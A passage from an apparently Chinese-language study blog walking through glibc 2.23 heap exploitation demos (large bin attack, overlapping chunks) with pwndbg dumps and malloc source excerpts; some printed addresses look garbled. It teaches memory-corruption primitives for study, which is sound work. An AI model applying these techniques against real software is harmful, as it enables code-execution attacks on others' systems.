alt="image.png"><br>过程如下：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">40</span>gx p1<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>&lt;p1<span class="hljs-number">-2</span> <span class="hljs-number">0x00000000000000a1</span>&lt;-- p1<span class="hljs-number">-1</span><br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x00007fffff3f3f68</span>      <span class="hljs-number">0x00007fffff3f3f68</span><br><span class="hljs-number">0x8007020</span>:      <span class="hljs-number">0x0000000008007000</span>      <span class="hljs-number">0x0000000008007000</span><br><span class="hljs-number">0x8007030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007040</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007050</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007060</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007070</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007080</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007090</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000391</span>  &lt;-- p1<span class="hljs-number">-2</span> [be freed]<br><span class="hljs-number">0x80070b0</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007fffff3f3b78</span>  &lt;-- fd, bk<br><span class="hljs-number">0x80070c0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070d0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070e0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070f0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007100</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007110</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007120</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007130</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2<span class="hljs-number">-2</span> [be freed]<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x00007fffff3f3fa8</span>      <span class="hljs-number">0x00007fffff3f3fa8</span>  &lt;-- fd, bk<br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x0000000008007460</span>  &lt;-- fd_nextsize, bk_nextsize<br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>整理的过程如下所示，需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* place chunk in bin */</span><br><br><span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>  &#123;<br>      [ ... ]<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);<br>    fwd = bck-&gt;fd;<br><br>    <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>        size |= PREV_INUSE;<br>        <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (bck-&gt;bk-&gt;size))<br>          &#123;<br>              [ ... ]<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; fwd-&gt;size)<br>              &#123;<br>                  [ ... ]<br>              &#125;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) fwd-&gt;size)<br>              [ ... ]<br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                victim-&gt;fd_nextsize = fwd;<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                fwd-&gt;bk_nextsize = victim;<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>              &#125;<br>            bck = fwd-&gt;bk;<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>      [ ... ]<br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>又 free 了一个大小为 0x510 的 large bin chunk。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800042013-1d711f68-c354-4998-b96d-c81143bc0dbe.png#clientId=u38185df4-f4d6-4&from=paste&height=93&id=uc5e947d7&name=image.png&originHeight=185&originWidth=1115&originalType=binary%E2%88%B6=1&size=223170&status=done&style=none&taskId=u43bf1cde-908a-435d-8a89-7fd4ddddc5e&width=557.5" alt="image.png"><br>也就是说现在 unsorted bin 有两个空闲的 chunk，末尾是大小 0x390 大小的 chunk，第一个是 size 为 0x510 的 chunk。<br>现在，我们分配一个大小小于释放的第一个大块的块。这将把释放的第二个大块移动到 largebin 列表中，使用释放的第一个大块的部分进行分配，并将释放的第一个大块的剩余部分重新插入 unsorted bin 中: [0x80070a0]<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622798550218-05a5854a-3423-408b-aea3-bb4c1d048ed0.png#clientId=u38185df4-f4d6-4&from=paste&height=625&id=u13e07ab3&name=image.png&originHeight=859&originWidth=672&originalType=binary%E2%88%B6=1&size=561185&status=done&style=none&taskId=ucad99ee5-53d8-4874-a74e-dc69d0f7e7e&width=489" alt="image.png"><br>然后我们修改 p2（large bin chunk），修改结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622798777446-acb7e804-62f5-4630-ba9e-4c22e764d786.png#clientId=u38185df4-f4d6-4&from=paste&height=163&id=u59355196&name=image.png&originHeight=325&originWidth=816&originalType=binary%E2%88%B6=1&size=162888&status=done&style=none&taskId=u309e3074-8bf7-412f-9996-95c4dd65a3c&width=408" alt="image.png"><br>此时的内存布局变为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000000003f1</span><br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9c0</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9a8</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800129568-92d862e5-b223-4675-a400-8d4da3a01694.png#clientId=u38185df4-f4d6-4&from=paste&height=111&id=u6a033717&name=image.png&originHeight=221&originWidth=829&originalType=binary%E2%88%B6=1&size=34972&status=done&style=none&taskId=u06ac7c6d-fd63-4162-939a-ef7769d5588&width=414.5" alt="image.png"><br>进行 malloc(0x90) 操作，此时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000000003f1</span><br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079a0</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079a0</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3<span class="hljs-number">-2</span><br><span class="hljs-number">0x80079a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span><br><span class="hljs-number">0x80079b0</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x00007ffffffed9c0</span><br><span class="hljs-number">0x80079c0</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x00007ffffffed9a8</span><br><span class="hljs-number">0x80079d0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var1<br><span class="hljs-number">0x7ffffffed9d0</span>: <span class="hljs-number">0x00000000080079a0</span>      <span class="hljs-number">0x00000000080079b0</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var2<br><span class="hljs-number">0x7ffffffed9c8</span>: <span class="hljs-number">0x00000000080079a0</span>      <span class="hljs-number">0x00000000080079a0</span><br></code></pre></td></tr></table></figure><p>可以看到，栈上的两个变量也被修改成了 victim，对应的语句分别是 bck-&gt;fd = victim; 和 ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;。<br>与第一次 malloc(0x90) 过程类似：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（size = 0390），放入 small bin 中，标记该序列的 small bin 有空闲 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（size = 0x510）</li></ul><p>由于这个过程中判断条件 (unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size) 为假，程序将进入 else 分支，<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800365641-3ebd263a-905f-4ca7-81f8-2b646fcecfcc.png#clientId=u38185df4-f4d6-4&from=paste&height=75&id=u596894f8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=840&originalType=binary%E2%88%B6=1&size=41189&status=done&style=none&taskId=u714d7b80-03ec-439b-8b48-c860cd2a7df&width=420" alt="image.png"><br>其中 fwd 是 fake p2，victim 是 p3，接着 bck 被赋值为 (&amp;stack_var1 - 2)。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800412726-ce75c5cd-107f-45db-bb6c-56cbcb14e42f.png#clientId=u38185df4-f4d6-4&from=paste&height=66&id=u9b02184b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=855&originalType=binary%E2%88%B6=1&size=43024&status=done&style=none&taskId=uf9af952d-279d-4d9b-9420-9434415605d&width=427.5" alt="image.png"><br><strong>在一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向。这个循环的意思是找到一个比当前 fwd 指的 chunk 要大的地址，存入 fwd 中</strong>。<br>由于当前 fwd 的 size 被我们修改过 =0x3f0，所以没有进入循环。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800436189-5bdc374c-dea1-44f6-988f-703c6f526fba.png#clientId=u38185df4-f4d6-4&from=paste&height=62&id=ub93e4540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=123&originWidth=849&originalType=binary%E2%88%B6=1&size=40594&status=done&style=none&taskId=u018824df-aecc-4366-845a-e9c3f038d74&width=424.5" alt="image.png"><br>这个原本的意思是把从 unsorted bin 中来的 chunk 插入这个序列中，但是这里没有检查合法性。这里存在这一个利用：<br>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize<br><span class="hljs-comment">// then</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addr2-&gt;fd_nextsize = victim;<br><span class="hljs-comment">// 等价于</span><br>*(addr2+<span class="hljs-number">4</span>) = victim;<br></code></pre></td></tr></table></figure><p>所以修改了 stack_var2 的值。<br>接着还存着另外一个利用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bck = fwd-&gt;bk;<br><span class="hljs-comment">// ......</span><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>修改了 stack_var1 的值。至此利用完毕。<br><strong>总结一下利用的条件</strong>：</p><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li></ul><h1 id="overlapping-chunks-2-23"><a href="#overlapping-chunks-2-23" class="headerlink" title="overlapping_chunks-2.23"></a>overlapping_chunks-2.23</h1><p>运行调试，在进行过 3 次 malloc 后<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622514153255-1bb092d9-3266-4d67-b238-21e4cc319b76.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u0e8f706f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=1091&originalType=binary%E2%88%B6=1&size=733998&status=done&style=none&taskId=u4084056e-68e3-490a-b30e-7de2fdfe0a1&width=545.5" alt="image.png"><br>查看 heap 信息<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622514122938-a51bb9d8-0555-4952-a61d-3a804c44e4a7.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u5f03230f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=572&originalType=binary%E2%88%B6=1&size=337493&status=done&style=none&taskId=u73c5c748-0a2b-4343-9486-782c2265e38&width=286" alt="image.png"><br>然后给三个 chunk 赋初值<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622514203555-8051785d-56ac-4edc-8908-3f62f2a0448e.png#clientId=u347f053a-7aac-4&from=paste&height=287&id=u4bf7a318&margin=%5Bobject%20Object%5D&name=image.png&originHeight=574&originWidth=1049&originalType=binary%E2%88%B6=1&size=657616&status=done&style=none&taskId=u1cf39fd7-f761-4451-813a-cf1434a6e3a&width=524.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622474998319-34920298-09e9-41bb-ad5d-c7dc4814be8b.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u23dad15b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=634&originWidth=1086&originalType=binary%E2%88%B6=1&size=790782&status=done&style=none&taskId=u626bb9d4-b66b-42c2-b5c2-89c7ae34f95&width=543" alt="image.png"><br>然后我们 free 掉 p2,<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622476766668-9dcac8c9-d35f-4f8c-9304-ef91191099df.png#clientId=u347f053a-7aac-4&from=paste&height=467&id=u4b4ea171&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1317&originalType=binary%E2%88%B6=1&size=1219380&status=done&style=none&taskId=ub3ae0add-f74d-4bd2-907f-bb40aa2f23e&width=658.5" alt="image.png"><br>发现它被加入到 unsortedbin 链表中<br>现在让我们模拟一个可以改写 p2.size 的溢出。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622513413827-0e1a8618-40e9-40da-a021-97b284951f3a.png#clientId=u347f053a-7aac-4&from=paste&height=195&id=u4a17cb7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1183&originalType=binary%E2%88%B6=1&size=296512&status=done&style=none&taskId=u21b36095-9ef1-43aa-8f8c-4ff6d145fa7&width=591.5" alt="image.png"><br>对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。<br>至少我们要确保 pre_in_use 为 true，不要让 p1 被误认为被 free 了。<br>我们将 p2 的 size 改写为 0x181，之后的 malloc 就会返回给我们一个 0x178（可使用大小）的堆块。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622513817911-24eda3e7-f68b-43dd-a418-89cf32446c0e.png#clientId=u347f053a-7aac-4&from=paste&height=447&id=u465f6ccd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=893&originWidth=1307&originalType=binary%E2%88%B6=1&size=1031294&status=done&style=none&taskId=ud4c7216b-d77c-4f1d-a866-aeadd12ac7a&width=653.5" alt="image.png"><br>返回给 p4 的地址就是原来 p2 的，而且 p4 中包含了还没被 free 的 p3。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622514733212-3487b9d4-d731-41cd-af57-0892d47e58cf.png#clientId=u347f053a-7aac-4&from=paste&height=397&id=u874ea1cc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=793&originWidth=1141&originalType=binary%E2%88%B6=1&size=553464&status=done&style=none&taskId=ucd76f966-66ff-412b-910e-f7793e9b391&width=570.5" alt="image.png"><br>能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。<br>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure><p>即使用当前块指针加上当前块大小。在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。<br>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。<br>简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。<br>​</p><h1 id="overlapping-chunks-2-2-23"><a href="#overlapping-chunks-2-2-23" class="headerlink" title="overlapping_chunks_2-2.23"></a>overlapping_chunks_2-2.23</h1><p>这是一个简单的堆块重叠问题。<br>也被称为非相邻 free chunk 合并攻击。<br>首先 malloc 五个堆块：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515531424-cd47ecf3-46e1-4d50-b4bf-18d77ec88df1.png#clientId=u347f053a-7aac-4&from=paste&height=337&id=ub7194792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=673&originWidth=1025&originalType=binary%E2%88%B6=1&size=589779&status=done&style=none&taskId=u03ef26d3-2974-4be4-84f7-dbebae19735&width=512.5" alt="image.png"><br>查看此时 heap<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515558942-de608b90-b069-4067-96a5-7d76a3cc3ffc.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=u5270233b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=680&originalType=binary%E2%88%B6=1&size=407793&status=done&style=none&taskId=ufa6339f8-57b8-46f0-bb5e-331d1df509f&width=340" alt="image.png"><br>输出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">chunk p1 from <span class="hljs-number">0x8007010</span> to <span class="hljs-number">0x80073f840</span><br>chunk p2 from <span class="hljs-number">0x8007400</span> to <span class="hljs-number">0x80077e841</span><br>chunk p3 from <span class="hljs-number">0x80077f0</span> to <span class="hljs-number">0x8007bd842</span><br>chunk p4 from <span class="hljs-number">0x8007be0</span> to <span class="hljs-number">0x8007fc843</span><br>chunk p5 from <span class="hljs-number">0x8007fd0</span> to <span class="hljs-number">0x80083b8</span><br></code></pre></td></tr></table></figure><p>然后填充赋值<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515720689-8b0ac35b-ad27-4a5b-81df-052bbb9cc016.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u105dc4ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=633&originWidth=982&originalType=binary%E2%88%B6=1&size=623807&status=done&style=none&taskId=u03d819ac-4cd2-486e-9a66-f124ca178ae&width=491" alt="image.png"><br>查看<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515836591-1f264a70-acb2-48e4-89b8-d2ecb4a63b33.png#clientId=u347f053a-7aac-4&from=paste&height=211&id=ue6c8de7d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1079&originalType=binary%E2%88%B6=1&size=445916&status=done&style=none&taskId=uce6ac4ca-4934-49e8-b21e-de027200e44&width=539.5" alt="image.png"><br>此时释放 p4，因为 p5 的存在所以 p4 不会被合并。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515878233-3b2e58f0-c6d1-4322-8d2a-181a94bdf214.png#clientId=u347f053a-7aac-4&from=paste&height=355&id=u797679fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=710&originWidth=864&originalType=binary%E2%88%B6=1&size=604887&status=done&style=none&taskId=u2e8d5858-ac53-43e5-8f9a-78adba03a9b&width=432" alt="image.png"><br>然后我们在 p1 触发一个溢出，将 p2 的 size 改写成 p2 和 p3 大小的和。之后更新 presize 的时候是通过 p2 的地址加上 p2 的 size 来寻找的要修改的位置的，这里刚好就把 p4 头部的 presize 给改掉了。<br>之后 free(p2)的时候，分配器就会认为 p4 是下一个块。然后就会错误地将 p3 和 p2 合并。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516023428-d9daa7d7-fe65-4445-8627-a57b829b2910.png#clientId=u347f053a-7aac-4&from=paste&height=477&id=u0779c540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1095&originalType=binary%E2%88%B6=1&size=1034227&status=done&style=none&taskId=u5fc07d71-872d-4906-b822-27999e48bb6&width=547.5" alt="image.png"><br>这时候 malloc 一个大小 2000 的堆 p6&lt;0xbd1，返回给 p6 的地址就是 p2 的地址了，p6 内部也包含了未被 free 的 p3，又造成了 overlapping，修改 p6 内容即可修改 p3 内容。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516230046-bd2ac17d-b73c-46c4-a0a0-bb91122f9472.png#clientId=u347f053a-7aac-4&from=paste&height=461&id=ud4e0d6d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=922&originWidth=1062&originalType=binary%E2%88%B6=1&size=593880&status=done&style=none&taskId=u9824bb34-39a1-41f9-8491-007382d7ca3&width=531" alt="image.png"><br>我们就可以用 p6 改写 p3 中的任何数据。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516417819-5207045e-f9a8-4206-90b9-5b16c59a6899.png#clientId=u347f053a-7aac-4&from=paste&height=46&id=ub5b5f7af&margin=%5Bobject%20Object%5D&name=image.png&originHeight=91&originWidth=403&originalType=binary%E2%88%B6=1&size=27579&status=done&style=none&taskId=u06c3ebff-470c-4903-a2ee-1de73baece8&width=201.5" alt="image.png"><img 